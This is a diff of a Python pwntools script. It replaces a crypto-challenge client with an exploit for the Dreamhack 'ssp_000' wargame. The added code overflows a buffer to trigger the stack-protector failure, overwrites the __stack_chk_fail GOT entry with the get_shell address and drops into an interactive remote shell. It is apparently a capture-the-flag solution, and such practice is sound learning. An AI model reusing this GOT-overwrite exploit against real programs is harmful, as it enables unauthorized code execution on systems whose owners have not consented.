@@ -1,31 +1,16 @@
-from pwn import remote
-from Crypto.Util.number import bytes_to_long
-import binascii
+from pwn import *
 
-def messageToHex(m):
-  return binascii.hexlify(m.encode())
 
-def sendCmd(rem, num) :
-  print(rem.recvuntil(b"Flag\n"))
-  rem.sendline(str(num).encode())
-  if num == 1 or num == 2:
-    rem.recvuntil(b": ")
+port =  18031
+rem = remote("host3.dreamhack.games", port)
 
-port = 11675
-rem = remote("srv1.kitriwhs.kr", port)
+elf = ELF("./Dreamhack/ssp_000/problem/ssp_000")
+addr = elf.got["__stack_chk_fail"]
+value = elf.symbols["get_shell"]
 
-print(rem.recvline())
+rem.sendline(b"A" * 0x50)
 
-# sendCmd(rem, 3)
-# encoded_flag = rem.recvline().decode('utf-8')
-# flag_val = encoded_flag[encoded_flag.index('=') + 2 : -1]
-# print(flag_val)
+rem.sendlineafter(b"Addr :", str(addr))
+rem.sendlineafter(b"Value :", str(value))
 
-sendCmd(rem, 1)
-rem.sendline(messageToHex("hello"))
-test = rem.recvline().decode()
-print(test)
-
-sendCmd(rem, 2)
-rem.sendline(test.encode())
-print(bytes.fromhex(rem.recvline().decode()).decode("utf-8"))
+rem.interactive()
